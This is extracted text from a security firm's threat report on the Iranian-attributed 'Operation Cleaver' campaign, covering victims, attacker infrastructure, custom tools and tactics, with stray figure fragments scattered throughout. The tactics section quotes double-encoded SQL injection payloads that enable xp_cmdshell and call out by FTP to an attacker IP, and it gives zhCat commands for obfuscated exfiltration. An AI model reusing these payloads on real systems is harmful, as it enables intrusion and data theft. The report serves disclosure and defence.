 	       c:\users\jimbp\desktop\binder_1 - for cleaver\binder_1\obj\x86\release\setup.pdb
 	
 	
 	
     3   PDBs associated with the keystroke loggers, artifacts, and numerous other tools, e.g.:
 	e:\Projects\Cleaver\trunk\MainModule\obj\Release\MainModule.pdb




 WHY EXPOSE IRAN NOW?We believe our visibility into this campaign represents only a fraction of Operation Cleaver’s full
 scope.We believe that if the operation is left to continue unabated, it is only a matter of time
 before the world’s physical safety is impacted by it.While the disclosure of this information will
 be a detriment to our ability to track the activity of this group, it will allow the security industry as
 a whole to defend against this threat.As such, we are exposing this cyber campaign early in an
 attempt to minimize additional real-world impact and prevent further victimization.•	 Numerous domains used in the campaign were registered in Iran.•	 Infrastructure leveraged in the attack was registered in Iran to the corporate entity Tarh
    Andishan, which translates to “invention” or “innovation” in Farsi.•	 Source netblocks and ASNs are registered to Iran.•	 Hacker tools warn when their external IP address traces back to Iran.•	 The infrastructure is hosted through Netafraz.com, an Iranian provider out of Isfahan, Iran.•	 The infrastructure utilized in the campaign is too significant to be a lone individual or a small
    group.We believe this work was sponsored by Iran.Operation Cleaver Targets Critical Infrastructure Around the World
 •	 US Military targets including NMCI in October 2013.5 Confirmed targeting of global
    government entities.•	 Networks and systems targeted in critical industries like energy and utilities, oil and gas, and
    chemical companies.•	 Assets (both cyber and physical) and logistics information were compromised at major airline
    operators, airports, and transportation companies.•	 Various global telecommunications, technology, healthcare, aerospace, and defense
    companies were breached as part of the operation.•	 Confidential critical infrastructure documents were harvested from major educational
    institutions around the world.Iran’s Cyber Hacking Skills Have Evolved
 •	 Initial compromise techniques include SQL injection, web attacks, and creative deception-
    based attacks – all of which have been implemented in the past by Chinese and Russian
    hacking teams.•	 Pivoting and exploitation techniques leveraged existing public exploits for MS08-067 and
    Windows privilege escalations, and were coupled with automated, worm-like propagation
    mechanisms.•	 Customized private tools with functions that include ARP poisoning, encryption, credential
    dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and
    SMB communications, network interface sniffing, and keystroke logging.•	 The ability to build customized tools to compromise any target they choose.10
#OPCLEAVER


 Indicators of Compromise (IOC)
 •	 Private signing certificates of one victim were captured allowing the Operation Cleaver team to
    compromise the entirety of their organization.•	 Over the past two years, Cylance has collected over 8GB of data including over 80,000 files of
    exfiltrated data, hacker tools, victim logs, and highly sensitive reconnaissance data.•	 Data from sinkholed command and control servers has allowed us to track this active campaign.•	 Cylance is releasing more than 150 IOCs and samples associated with the Cleaver campaign to
    empower the security community to detect existing compromises in their own organizations, as
    well as potentially block future attacks from these teams.Speculation

 •	
                                 6f20476 f64
    This campaign continues Iran’s retaliation for Stuxnet, Duqu, and Flame.•	
                               44
    This is a state-sponsored campaign.•	
 •	                          20
    There is a possibility that this campaign could affect airline passenger safety.This campaign’s intentions may be to damage Industrial Control Systems (ICS), Supervisory
                              c
                            c2




    Control and Data Acquisition (SCADA) systems, and impact Critical Infrastructure and Key
    Resources (CIKR).04576696




 •	 This campaign could be a way to demonstrate Iran’s cyber capabilities for additional
    geopolitical leverage, due to the breadth and depth of their global targets.•	 There is an intense focus on CIKR companies in South Korea, which could give Iran additional
    clout in their burgeoning partnership with North Korea.Countries impacted include Canada,
  China, England, France, Germany, India, Israel, Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South
  Korea, Turkey, United Arab Emirates, and the US.Compromised systems include Microsoft Windows web servers running IIS and ColdFusion,
 Apache with PHP, many variants of Microsoft Windows desktops and servers, and Linux servers.Compromised network infrastructure included Cisco VPNs as well as Cisco switches and routers.Unlike Stuxnet, no exotic exploitations (such as 0-days) were observed.Within our investigation, we had no direct evidence of a successful compromise of specific
 Industrial Control Systems (ICS) or Supervisory Control and Data Acquisition (SCADA) networks, but
 Cleaver did exfiltrate extremely sensitive data from many critical infrastructure companies allowing
 them to directly affect the systems they run.This data could enable them, or affiliated organizations,
 to target and potentially sabotage ICS and SCADA environments with ease.We discovered over 50 victims in our investigation, distributed around the globe.Ten of these
 victims are headquartered in the US and include a major airline, a medical university, an energy
 company specializing in natural gas production, an automobile manufacturer, a large defense
 contractor, and a major military installation.The four targets in Israel and the five targets in Pakistan
 are comprised of education, aerospace, airports, airlines, healthcare and technology.Further victims
 were identified in numerous Middle Eastern countries as well as ones in Northern Europe including
 the UK, France, and Germany.Central America was not immune either with a large oil and gas
 company on the list.In fact, oil and gas was a particular focal point for the Cleaver team, going after
 no less than nine of these companies around the world.Universities were targeted in the US, India, Israel, and South Korea.The attackers targeted research
 efforts, student information, student housing, and financial aid systems.They had a penchant for
 pictures, passports, and any specifc identifying information.Perhaps the most bone-chilling evidence we collected in this campaign was the targeting and
 compromise of transportation networks and systems such as airlines and airports in South Korea,
 Saudi Arabia and Pakistan.The level of access seemed ubiquitous: Active Directory domains
 were fully compromised, along with entire Cisco Edge switches, routers, and internal networking
 infrastructure.Fully compromised VPN credentials meant their entire remote access infrastructure
 and supply chain was under the control of the Cleaver team, allowing permanent persistence
 under compromised credentials.They achieved complete access to airport gates and their security
 control systems, potentially allowing them to spoof gate credentials.They gained access to PayPal
 and Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered
 access to the victim’s domains.We were witnessed a shocking amount of access into the deepest
 parts of these companies and the airports in which they operate.Canada - Calgary                     13.Mexico - Mexico City                          25.UAE - Abu Dhabi
       2.Canada - Hamilton     546            14.Pakistan - Karachi (2)                        26.UAE - Al Garhoud
       3.China - Beijing                      15.Pakistan - Lahore                             27.USA - California - Los Angeles (2)
       4.England - Oxford                     16.Pakistan - Multan                             28.USA - California - San Diego
       5.France - Paris                       17.Pakistan - Peshawar                           29.USA - California - San Jose
       6.Germany - Dusseldorf                 18.Qatar - Doha (4)                              30.USA - Michigan - Dearborn
       7.Germany - Frankfurt                  19.Saudi Arabia - Dhahran                        31.USA - Texas - Houston (2)
       8.India - New Delhi (2)                20.Saudi Arabia - Jeddah                         32.USA - Texas - Fort Worth
       9.Israel - Haifa (3)                   21.South Korea - Incheon                         33.USA - Texas - Southlake
       10.Israel - Rehovot                    22.South Korea - Goyang-si                       34.USA - Virginia - Fairfax
       11.Kuwait - Ahmadi                     23.South Korea - Seoul (7)                       35.USA - Virginia - McLean
       12.Kuwait - Kuwait City                24.Turkey - Antalya
     Figure 2: Geographic distribution of victims, as determined by the global headquarters of the parent
     company or organization breached.However, in this report we offer our observations on the
sources of Operation Cleaver in order to benefit those that
rely on attribution such as Law Enforcement.Operation Cleaver is believed to consist of at least 20
hackers and developers, collaborating on projects and
missions to support Iranian interests.Many of the targets were
predominately English-speaking and a majority of the team
members were capable of reading and writing in English.We
present evidence that this team is operating, at least in part,
out of Iran and in the interests of Iran.The skills and behavior
of the Operation Cleaver teams are consistent with, and in
one case surpasses, Iran’s cyber capabilities as we know
them today.For a complete list of IPs and domains related to this
campaign, please refer to the Indicators of Compromise              Figure 4: The logo of the Army of the
                                                                    Guardians of the Islamic Revolution,
section.also known as the Islamic Revolutionary
                                                                    Guard Corps (IRGC).ATTACKER IP ADDRESSES
Over the course of multiple incident response engagements related to Operation Cleaver, we
were able to identify a small set of IP addresses which were commonly used during the initial
stages of an attack.The IP address 78.109.194.114 served as a source for one of the primary attackers.They were observed conducting SQL injections, controlling backdoors, as well as exfiltrating
information using this address, and the address appears in multiple software configurations
recovered from staging servers over a period of time.GeoIP Location: Iran
	      Net block: 78.109.194.96 - 78.109.194.127
	      Owner: Tarh Andishan
	      Email: tarh.andishan(at)yahoo.com
	      Phone: +98-21-22496658
	      NIC-Handle: TAR1973-RIPE




18
#OPCLEAVER


  This IP address was also observed in multiple software configurations.This particular net block
  was used over an extended period of time, indicating these were under the Cleaver team’s
  physical control.Additionally, prior netblocks used by the same team demonstrated to us that
  this wasn’t simply a case of proxying or “island hopping”.For more information see the Tarh
  Andishan section of this report.The IP address 159.253.144.209 was a source for a secondary attacker in various
  compromises.They were observed conducting SQL injection attacks.While this IP was this
  registered in the Netherlands, we believe they used Softlayer’s Citrix demo environment to
  launch these attacks which is consistent with proxying or “island hopping”.GeoIP Location: Netherlands
  	     Net block: 159.253.144.208 - 159.253.144.223
  	     ASN: Softlayer Technologies, Inc.

                 20476 f64
  	     IP Location: Netherlands, Amsterdam with Iranian sourcing.46f
            04
  ATTACKER 2DOMAINS
                               c
                             c2




  A number of Cleaver’s attack methods require a persistent server.In many cases, these servers
  were referenced by domain names.The following malicious domains are operated by this
                     04576696




  organization and are grouped by the registrant’s email address.We managed to obtain a large collection of the internally developed tools used by the Cleaver
  team, many of which were developed by its members.Due to operational security failures, these
  tools contain information that provided us insight into their organization and operations.The creator generates
an ASPX web shell using user input as well as a collection of templates.The web shell could
then be installed via xp_cmdshell, or any other method which would grant the attacker write
access.The web shell is accessible by the shell client directly.The shell client is a portion of Shell Creator 2 that was not designed to be run on a compromised
computer.We originally located it on a staging server being utilized for multiple attacks as well as
a tool for sharing data between members of the organization’s team.The shell client, which is developed in Java and is easily decompiled, is a simple interface with
a feature to protect the operator from making a critical mistake.When executed, and before
any connection to an instance of the web shell is initiated, the shell client communicates with
freegeoip.net in order to get the external IP address of the current user.The country of origin
is then shown to the user, to inform them of what country it appears they are connecting from.The assumed purpose of this feature is to ensure that a proper proxy is in use, and the real origin
of the attacker is not revealed.After decompiling the shell client, we found the following code segment controlling the display of
this IP location information.Figure 5: Java source code showing how Shell Creator 2 distinguishes between a source IP address
        coming from Iran (red) versus any other country (green).This code handles the XML response from freegeoip.net, and displays the information
as different colors based on different attributes.For instance, if the string “ERROR” is in the
response, the text is displayed with the color magenta.If the string IRAN is in the response, the
text is displayed with the color red.It should be noted that no other country name contains the
substring IRAN.20
#OPCLEAVER


  Shell Creator 2 (cont.)Figure 6: Shell Creator 2 alerts the user in red when the IP being used can be sourced to Iran.6  f 20476 f64
                  Figure 7: Shell Creator4
                                     4    2 notifies the user in green when their source IP address is not Iran.20
                                 c
                               c2




  Net Crawler
                       04576696




  Net Crawler is a tool developed in C# that exhibits worm-like behavior in order to gather cached
  credentials from any and all accessible computers on an infected network.This is done with
  Windows Credential Editor (WCE) and Mimikatz in combination with PsExec.Different versions of
  this malware contain ASCII art which names the authoring group as Zhoupin (in “leetspeak” as
  “Zh0up!n”).6b2
                  6e
                 9




                                   86
                                546
         Figure 8: Net Crawler version 1.0 has ASCII art showing                Figure 9: Updated ASCII art found in Net
         the use of “Zh0up!n” in the campaigns tools.Crawler tool shows a version of “Zh0up!n”
                                                                                shortened to simply “Zh0”.For more information on Net Crawler, see the Tactics, Techniques and Procedures section.It is the longest developed
malware family discovered by this group, and has been used in campaigns for close to two
years.How it operates can vary greatly from version to version.For a detailed technical analysis
of TinyZBot, see the Tactics, Techniques and Procedures section.As TinyZBot is developed in
C#, many versions can be decompiled to code very similar to their originals, including names
of namespaces.Many versions were obfuscated with a legitimate tool for developers named
SmartAssembly, which makes the recovery of some names implausible.We obtained multiple versions from which we were able to recover many of the original names of
variables and namespaces.In a number of these samples, the primary namespace for TinyZBot
is named Zhoupin_Cleaver.In every version of TinyZBot that is not obfuscated, there is a
code base referred to as Cleaver.This code base is also shared in other malware developed by
this organization, such as Csext.PrivEsc
PrivEsc is a blatant plagiarism of an existing exploit for Microsoft Windows released in January
2010 called MS10-015, “Vulnerabilities in Windows Kernel Could Allow Escalation of Privilege”,
popularly known as the KiTrap0D exploit which was released publicly.The Cleaver team clearly
modified the source code and compiled a new version.The only detectable modification was to
change the original author’s name to instead display the following:

                                    Zhopin Exploit Team

This is not the only case of this team relabeling others’ work as their own.Logger Module
Logger module is a component of the PVZ (PVZ is shorthand for Parviz, one of the members of
the Cleaver team) bot tool chain.When executed, it will capture the user’s keystrokes and save
them to a location which PVZ bot then exfiltrates.The logger module binary’s file description
value is the following:

                ye file khube DG.ba in ham kari nadashte bashin

Roughly translated from Persian, this text says:

                     DG is a good file, don’t bother with this



22
#OPCLEAVER


  Logger Module (cont.)This text could potentially be a note intended to stay internal, or could be an attempt to persuade
  an unsuspecting victim to assume the file is not malicious.The Product Name value is GOOD FILE.For more information on the PVZ bot tool chain, see the Tactics, Techniques, and Procedures
  section.CCProxy
  CCProxy is a publicly available proxy server for Windows, which can handle a variety of protocols.We do not believe that this organization was involved in the development or modification of
  CCProxy, but they have been observed using it.We recovered a CCProxy configuration, which
  exposed various operational details.6f 2 0476 f64
                                4 as well as a
  The configuration allowed for remote
                              4
                           20 was User-001,
  connections, limited by a username
  limited IP range.The username
                               c




  which is the default value.The limited IP range
                             c2




  covered one IP: 78.109.194.114.04576696




  This IP address is located in Iran, and is owned by
  Tarh Andishan.The configuration also indicates which address
  the CCProxy server should listen on for incoming
  connections such as web (80) and mail (25).6b2
                6e
               9




                                 86
                              546


                                                        Figure 10 (above): CCProxy configuration file
                                                        using the hardcoded IP address registered to Tarh
                                                        Andishan.Figure 11 (left): CCProxy configuration file showing the
                                                        use of web and mail as listening ports.This log was generated during the usage of the nbrute utility, which brute-forces network
 credentials and relies on NMAP to do so.The header of this NMAP log indicates that the computer
 used to run nbrute/nmap was set to Iran Daylight Time at the time of execution.Starting Nmap 6.25 at 2012-08-17 09:18 Iran Daylight Time

 With no known victims located in Iran, it is likely that this was executed on an attacker’s computer,
 and not on a victim’s computer.Squid Configuration
 A configuration file for a Squid proxy server was recovered.Figure 12: Squid configuration file showing the use of Tarh Andishan’s IP address.The net range of 78.109.194.114/28 was inserted into the allowed local networks with an RFC
 comment appended in order to make it look like it was part of the default configuration.It is likely
 this is the same reason a /28 net range was used, in order to not look like it was intended to only
 allow one IP.This would give the same access to resources accessible from the Squid proxy server
 to this Iranian IP address.TARH ANDISHAN
 Tarh Andishan is listed as the registrant for a number of small net blocks based upon the email
 address tarh.andishan(at)yahoo.com.The net blocks appear to rotate over time and
 registrant information is altered to accommodate ongoing operations and avoid potential public
 exposure.24
#OPCLEAVER


  TARH ANDISHAN (cont.)The networks are included below as well as the last time that net block was observed as active.• 78.109.194.96/27 - Current
  	     • 217.11.17.96/28 - 10/22/2014
  	     • 81.90.144.104/29 - 10/5/2014
  	     • 31.47.35.0/24 – 11/2012

  There are many seemingly legitimate Tarh Andishan related companies inside Tehran, but strong
  connections to Iranian backing have been difficult to prove definitively.“Tarh Andishan” is often
  translated as “Thinkers”, “Innovators” and “Inventors”.6 f 20476 f64
  The net blocks above have strong associations with state-owned oil and gas companies.These
                             4
  companies have current and former employees who are ICS experts.4
  Tarh Andishan has been 2
                          0
                         suspected in the past of launching attacks in the interest of Iran.The
                                c




  operators of the blog IranRedLine.org, which comments on Iran’s nuclear weapons efforts, has
                              c2




  mentioned in multiple posts having been the target of debilitating brute-force authentication attacks
                      04576696




  from IP addresses registered to the same Tarh Andishan team found in Cleaver.In one of IranRedLine.org’s blog posts8, the author speculates on Tarh Andishan’s involvement
  with the Iranian government by showing close proximity to SPND, the Organization of Defensive
  Innovation and Research; however, the phone number listed under the registrant contact
  information has yet to be completely validated.6b2
                 6e
                9




                                  86
                               546




           Figure 13: This image from IranRedLine.org demonstrates Tarh Andishan’s probably fabricated Whois
           address to the proximity to Iran’s SPND (Organization of Defensive Innovation and Research).The following profiles were built from reverse engineering, code
analysis, open source intelligence, incident response and forensics work.Personally identifiable
information about these members is not being shared publicly as it could endanger their lives and
would be irresponsible.Parviz
Parviz is a developer who worked on a variety of projects, and was primarily active in 2013.His
development skillset is based around his ability to develop in C/C++.He has been observed using
Visual Studio 2010, and his tools are written exclusively for Windows.Some of his tools were found
to be packed with ASPack.Parviz is the primary developer of the PVZ bot and multiple parts of its tool chain.Parviz is likely
associated with the PVZ bot as his name in hardcoded into the PDB file paths.The PVZ tool chain includes a variety of functionality, such as HTTP command and control
communications with an ASPX server-side component, a denial of service tool they developed, and
the public project named XYNTService used to run ordinary applications as services.PDBs

• C:\Users\parviz\documents\visual studio 2010\Projects\BotManager\		
Release\BotManager.pdb
• C:\Users\parviz\Documents\Visual Studio 2010\Projects\socket-test\		
Release\socket-test.pdb
• C:\Users\parviz\Documents\Visual Studio 2010\Projects\
XYNTServiceProject\XYNTServiceProject\Debug\XYNTService.pdb
• C:\Users\Parviz\documents\visual studio 2010\Projects\SendModule\		
Release\SendModule.pdb




26
#OPCLEAVER


  Nesha
  Nesha is one of the offensive members of this organization.Nesha was seen in breaches involving
  SQL injection as well as other techniques.Nesha often utilized web-based backdoors developed
  in ASPX, PHP as well as ColdFusion.A copy of an MS08-067 exploit developed in Python was
  recovered in which Nesha shamelessly replaced the original author’s name with his own.Nesha’s passwords very commonly include own handle.His passwords were frequently stored
  as hashes in backdoors, but common hash cracking methods were able to recover the plaintext
  versions.His observed password use is as follows:

  •   nesha nesha used as password in ColdFusion backdoors
  •   NeshaNesha12 used as password in ASPX backdoors.His tools are commonly
                              546
  developed in C++, Java, and C# (desktop and ASPX).These tools are often support tools, either
  monitoring the activity of other tools or supplementing the function of other tools gathering
  information during the infiltration process.Alireza’s code appears to be reused internally on
  projects such as TinyZBot.Alireza appears to be using a version control system for his code, and
  it is likely that others are using the same system.Based on the paths, the version control system in
  use is likely Apache’s Subversion.Use of a version control system is indicative of code sharing, but
  the use of an older system like Subversion, along with other evidence, suggests there is not a large
  amount of collaboration on projects and likely one developer working on each project at a time.This is not behavior typical of a professional development team.He has less English language
  proficiency than others in the organization, and likely has a supplemental role during compromises.He has been observed developing tools which cater to specific challenges in a compromise.His
  notable project was named Net Crawler, and a technical analysis of this tool can be found in the
  Tactics, Techniques and Procedures section.Thanks to a recovered test configuration for Net
  Crawler, we were able to determine that kaJ’s development computer has the name dev-castle,
  where he has the username kaJ and the password oaolrJ@vad.kaJ is believed to be the creator
  of the Zhoupin ASCII art displayed in Net Crawler.kaJ’s projects include the following techniques.20476 f64
  •   Interfacing with multiple cached credential dumping tools
  •   Interfacing with PsExec
                                 46f
  •   Worming behavior          4
                              20
  Jimbp
                               c
                             c2
                     04576696




  Jimbp is a .NET developer with minimal experience.His projects appear to be supplemental to
  TinyZBot and are very simplistic.It is believed he is the developer of the project Binder_1.This
  project was a simple malware binder which required manual configuration when compiling.His
  other work included creating a new service wrapper for TinyZBot.Some of the teams publicly known today include Iranian Cyber Army, Ashiyane,
     Islamic Cyber Resistance Group, Izz ad-Din al-Qassam Cyber Fighters, Parastoo, Shabgard, Iran
     Black Hats and many others9.However, even though the TTPs of the Cleaver team have some overlap to techniques used by
     Iranian Cyber Army (botnets), Ashiyane (SQL injection) and Syrian Electronic Army (phishing and
     RATs), we believe this is largely the work of a new team.Some connections to Ashiyane were
     discovered in our investigations including a reference to hussein1363, who had prior ties to
     the hacker group.Additional connections between team members and individuals exist but are
     predominantly speculative and have only been shared with law enforcement.Ultimately we believe the Cleaver team is a mix of existing team members and new recruits
     pulled from the universities in Iran.In this section we’ll
cover the commonly observed methods during different stages of the attack.INITIAL COMPROMISE
The initial compromise gets the attackers their first foothold into the target network.Once the
ability to execute arbitrary code has been established, an attacker’s job becomes quite a bit
easier.Since the vector of initial compromise is usually determined by what is vulnerable on the
target, we’ll cover just a few of the techniques we’ve seen Operation Cleaver use to initiate the
compromise.SQL Injection
SQL injection is a very common and simple attack method.It is made possible by a lack of input
sanitization by the vulnerable application before supplying that input into a SQL database query.SQL injection payloads used by this organization have been double encoded.Double encoding
SQL injection payloads allows for bypassing of various anti-exploitation filters, such as those
supplied by Web Application Firewalls (WAFs).The attackers would enable xp_cmdshell:

http://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@
b1=%20show advanced options;declare%20@b2%20varchar(8000);set%20@b2=%20xp_
cmdshell;%20EXEC%20master.dbo.sp_configure%20@b1,%201;RECONFIGURE;EXEC%20master.dbo.sp_configure%20@b2,%201;RECONFIGURE;--%20

Then connect outbound via anonymous FTP:

http://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@
b1=%20ftp -A 108.175.152.230;%20exec%20master..xp_cmdshell%20@b1--%20


Spear-Phishing Campaign
Using messaging methods such as email, attackers can social engineer users into downloading
and executing software, which quietly installs malware alongside of the desired program.Operation Cleaver has employed this technique numerous times across different organizations.32
#OPCLEAVER


  EasyResumeCreatorPro.com

  The domain EasyResumeCreatorPro.com was registered and a website setup which was a direct
  copy of a legitimate website at winresume.com.This is how the original site looked:




                                         6  f20476 f64
                                    4  4
                               20
           Figure 14: The original Easy Résumé Creator Pro website on winresume.com is legitimate.c
                              c2
                    b204576696
                  e6
                96




                                  86
           Figure 15: The fraudulent website, easyresumecreatorpro.com, is a fraudulent copy of the Easy
                               546
           Resume Creator Pro website to lure job candidates to download and install their TinyZBot agent.That’s not all they copied.In order to infect users, they combined the original Easy Resume Creator
  Pro product with malware by using a binder they developed internally named Binder_1.A binder
  is an application, which combines two executables (desired software and malware) into a single
  executable.The resulting executable masquerades as the desired software.The purpose is deception, to make
  the binder indistinguishable from the desired application.When executed, both applications are
  written to a temporary directory and executed.This way it appears that the desired application was
  executed, but the malware was also executed silently.The
                                                    attackers made the victims feel like they had a pending
                                                    job opportunity at the industrial conglomerate Teledyne.In
                                                    order to take advantage of this job opportunity, the victim
                                                    needed to use the fake résumé submission application
                                                    supplied by the malicious recruiter.Multiple domains were
                                                    registered in order to make the download sites seem more
                                                    realistic.These domains included other companies as they
                                                    tried to hit a wider audience.Figure 16: When the résumé submitting
application is executed, a splash screen is
displayed.• Teledyne-Jobs.com
                                                           • Doosan-Job.com
                                                           • NorthropGrumman.net

                                                    At this point, the résumé submission application checks the
                                                    Internet connection.If it is unable to connect to the Internet,
                                                    it will display a window to input proxy information.When this information is entered, the results are cached
                                                    in a location the dropped malware can access.After an
                                                    Internet connection is ensured, the malware (TinyZbot) is
                                                    dropped and executed.This clever scheme makes sure the
                                                    malware can connect to the command and control server,
Figure 17: Unable to connect to the Internet, the
                                                    and increases the chances that domain credentials are
tool prompts the user for proxy configuration
information.cached on the now infected machine.Shortly after, the main
                                                    application is launched.Figure 18: Final résumé submission form
displays to the user while the malware runs
freely in the background.34
#OPCLEAVER


  Teledyne Résumé Submitter (cont.)The first résumé submission form requests contact information.This form, like the rest of the
  submission forms, only stores the submitted information while the application is running.As the
  infected user is going through and filling out all this information, the malware is running in the
  background, logging their keystrokes, retrieving their stored passwords, etc.Once all the forms are
  filled out, the user goes to the submission form.6f20476 f64
                                 44
                               20
                                c
                              c2
                    b204576696
                   6




                       Figure 19: GET request to www.microsoft.com fakes the résumé submission.6e
                9




                                  86
                               546
  When the victim hits submit, the résumé submitter does a GET request to microsoft.com in order
  to make it seem like it is submitting something, then claims success.This method is particularly effective not only because of its level of deception, but even if the victim
  suspects that they are infected with malware, they are not as likely to speak up about it, as they
  would need to explain why they were submitting a job application for another company.This increase in privileges
allows for the attacker to gain access to privleged areas of the operating system as well as to
infect other computers on the target network.This team did not utilize any novel methods of privilege escalation, but they were observed
using a variety of publicly known exploits.PrivEsc is a compiled exploit, which leverages
the vulnerability commonly referred to as KiTrap0D (CVE-2010-0232).The exploit allows for
escalation of privileges on unpatched Windows operating systems from an unprivileged user to
kernel-level privilege.This vulnerability and the corresponding exploit were discovered and developed in 2010.The plagiarized version used in Operation Cleaver was compiled in May 2013, with a slight
modification to the public source code.This modification changed the author’s details to Zhopin
Exploit Team.Pivoting is the process of leveraging access from one compromised computer in order to gain
access to additional systems on the target network.This can involve launching attacks from the
compromised computer, or simply abusing access once it has been gained.Cached Credential Dumping
A very common method of pivoting on a predominantly Windows operating system based
network is to extract domain credentials which have been used on the compromised computer
from a credential cache.There are a few well-known tools which are capable of doing this given
sufficient privileges on the infected host.Two of these tools used by Cleaver are Mimikatz and
Windows Credential Editor.zhMimikatz and MimikatzWrapper
Two similar applications were developed by Operation Cleaver in order automate the execution
of Mimikatz.These applications are zhMimikatz and MimikatzWrapper.These applications store
multiple versions of Mimikatz in their resources.When executed, they determine which version
of Mimikatz to use based on whether the computer’s version of Windows is 32-bit or 64-bit.This
technique is uncommon in malware and shows the advanced skillset of the Cleaver team.Both
tools were developed in C#.36
#OPCLEAVER


  zhMimikatz and MimikatzWrapper (cont.)In the following examples, the computer name is TheComputerName, the username of the
  logged in user is TheUser, and that user’s password is ThePassword.At the time of execution,
  the system only has its own credentials available and no cached network credentials.zhMimikatz
  zhMimikatz executes the correct version of Mimikatz for the current system, and parses the results
  for any cached credentials.Figure 21: The MimikatzWrapper.The only external difference is that MimikatzWrapper also logs these results to res.txt in the
executing directory.This can make it useful for tools like the PVZ tool chain and Csext to execute
with logged results:




                          Figure 22: The MimikatzWrapper dumps credentials out to a file.38
#OPCLEAVER


  PsExec Spreading
  Once an attacker has credentials extracted from the cache, whether in hash form or in plaintext
  form, PsExec can be used to run commands on any other computer which accepts those domain
  credentials.If this technique is combined with cached credential dumping, it can be used to jump
  from computer to computer on a compromised network.NetC (Net Crawler)
  Net Crawler utilizes a cached credential dumping technique along with PsExec in order to
  worm throughout a network, collecting any and all credentials that it can extract from credential
  caches.It has the ability to do this with both Windows Credential Editor and Mimikatz.It starts by
  first extracting cached credentials from the infected computer’s cache.Once this is complete, it
                                   f20476 f64
  then continues to scan a set of configured IP addresses on the local subnet to determine which
                                  6
                                 4
  IP addresses have SMB related ports open.Then an iterative methodology is applied to brute
                                4
                              20
  forcing each SMB enabled target with each credential that was extracted from the cache.c




  When a positive result has been achieved, it will create a copy of itself with a modified
                             c2




  configuration stored as a PE resource, then send and execute the copy utilizing PsExec.This
                     04576696




  copy repeats the behavior of the original, but with already discovered credentials as well as
  newly discovered ones on the newly infected host.Any credentials found are reported back to
  the original infection.The following is a sample of some of the recovered results of Net Crawler executing on a live
 network:




                  Figure 23: The real output of a successfully run NetC effort at a victim organization.A more in depth analysis of Net Crawler, as part of the A Study in Bots series, will be available on
 Cylance’s blog.40
#OPCLEAVER


  MS08-067 Exploit
  MS08-067 is a vulnerability in Microsoft Windows made popular by the Conficker worm which can
  be exploited by a specially crafted packet to the operating system’s RPC network interface.This
  vulnerability has been patched since October 2008, but many networks have failed to update their
  systems even to this day.Operation Cleaver used a plagiarized version of a publicly available exploit for this vulnerability
  developed in Python.Someone in the Cleaver team (presumed to be Nesha) modified the exploit to
  read “By Nesha”.Jasus
                                    f20476 f64
  Jasus is an ARP cache poisoner developed by the Operation Cleaver team.It makes use of
                                   6
                                  4
  WinPcap and is developed in C. Compared to some other publicly available ARP cache poisoning
                                 4
                               20
  utilities, Jasus is poorly developed and without many useful features.The primary positive attribute
  of Jasus is its poor detection ratio by the antivirus industry.c
                              c2




  Cain & Abel
                      04576696




  Cain & Abel is a publicly available toolkit, which covers a wide range of functionality that assists
  attackers once they have compromised a node on a network.It has the ability to dump stored and
  cached credentials, and conduct attacks like ARP cache poisoning in order to capture credentials
  being transmitted on the network.It also has a remotely installable trojan named Abel, which
  enables some of its functionality on a remote target.b2




  We observed the Operation Cleaver team using Cain & Abel for extracting credentials from caches
                   6




  and the network when they are confident that there is little to no antivirus protection on the infected
                  e




  target.96




                                   6
  EXFILTRATION
                                  8
                               546
  Exfiltration is the process of moving information to an external site.In this context, it is the process
  of stealing information without being detected.Operation Cleaver has a strong focus on stealing
  confidential/privileged information, and they have utilized a few methods in order to facilitate this
  objective.This allowed them to use existing
command line utilities available on their targets in order to upload information.This is a versatile
technique as it does not require any additional software which could be detected.These
FTP servers were also observed during the infection process, as infected computers were
often instructed to download additional files from these FTP servers, including backdoors and
pivoting tools.The following IP addresses hosted FTP servers that were used in the infection of targets or in
the exfiltration of information.Its main functionality allows for a client and server communication channel, allowing
for information to be transported over the network simply.NetCat has an option when being
compiled to enable or disable the ability for NetCat to execute a command after the connection
is established.This feature can be abused to enable a reverse connecting shell, which can be
used to remotely control a target.NetCat’s network communications are in plaintext, and could be viewed by an egress filter
looking to block the exfiltration of sensitive information.The Operation Cleaver team was
observed attempting to use NetCat to exfiltrate information as well as use it as a reverse
connecting shell.The use of NetCat was later replaced with zhCat.42
#OPCLEAVER


  zhCat
  zhCat is a tool developed by the Operation Cleaver team which operates similarly to NetCat.Its
  main purpose is to create a channel that is capable of transporting information over the network.The changes made in zhCat allow for this information to be transferred with inline obfuscation and/
  or encryption.This makes it more difficult to detect that privileged information is being exfiltrated.The command line help (of a particular version) shows the following options:	




                                  6f20476 f64
                                44
                              20
                               c
                             c2
                     04576696




  Multiple obfuscation/encryption methods are available.The –h argument enables HTTP mode.This makes the traffic between zhCat instances look like benign HTTP traffic.Information can be supplied by standard input.If we observe the network communications during this transfer, we can see the following HTTP
 POST request.Note: research into ebizmba.com did not turn up any additional evidence of being involved
 with the development of zhCat.On the server side, we can see our message has been received:




 If stricter egress filtering is enabled, the attackers can use zhCat to also XOR encrypt the traffic
 with a shared key.These keys are stored inside zhCat.The following is the key used for XOR
 encryption:

     Sorry!The handle to file %s is not a valid handle any more.\nSorry!The handle to file %s is not a valid handle any more.The \n represents hex character 0x0A, which is a new line character.An attacker could set up a server instance of zhCat with the following command in order to
 enable both HTTP and XOR obfuscation:

                                zhcat.exe –h –p 1000 –l –x

 The client instance could then be invoked with the following command:

                     zhcat.exe –h –p 1000 –i 192.168.116.128 –x

 Once again, information can be supplied via standard input.44
#OPCLEAVER


 zhCat (cont.)Upon inspecting the network traffic again, we see the following HTTP POST request.6 f 20476 f64
                             4 4
                          20see this information being received:
 On the server side, we can
                               c
                             c2
                     04576696




 zhCat has a variety of other features such as port mirroring as well as traffic redirecting.PLink
                   b2




 PLink is one of the many utilities provided in the PuTTY (SSH) suite, which has many benign
                 e6




 purposes.It is capable of communicating over various protocols, the most notable being SSH.6




 The SSH protocol is a heavily utilized encrypted protocol, most commonly used for remote
               9




 administration of UNIX based operating systems.PLink is designed to implement some of the
                                  6
                                 8
 SSH functions related to forwarding traffic as well as other functionality.546
 Operation Cleaver uses PLink to forward local RDP ports to remote SSH servers.This allows them
 to easily connect to RDP servers inside the networks of their victims.These RDP connections can
